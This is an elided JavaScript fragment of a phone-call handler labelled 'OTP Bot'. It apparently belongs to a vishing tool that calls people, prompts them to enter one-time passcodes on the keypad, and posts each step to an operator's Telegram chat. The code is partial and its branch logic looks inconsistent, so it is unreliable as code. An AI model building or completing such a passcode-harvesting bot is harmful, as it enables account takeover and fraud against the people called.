module.exports = function (request, response) {
  ...
  /**
   * Intégration des dépendances Telegram
   */
    ...
    db.get("SELECT * FROM calls WHERE callSid = ?", [request.body.CallSid], (err, row) => {
      ...
      if (row.otpsend == 0 && input.match(/^[1-2]$/) == null) {
        ...
        if (input == 1) {
          ...
          bot.telegram.sendMessage(config.telegramChatId, `OTP Bot: Status: **Send OTP** - ${row.user}`);
          respond(ask);
        } else {
          bot.telegram.sendMessage(config.telegramChatId, `:mobile_phone: ${row.itsto}: Status: **User pressed 2 (Exit)** - ${row.user}`);
          respond(otpSendEnd);
        }
      } else if (input.length == length && input.match(/^[0-9]+$/) != null && input != null) {
        /**
         * Audio de fin
         */
        respond(end);
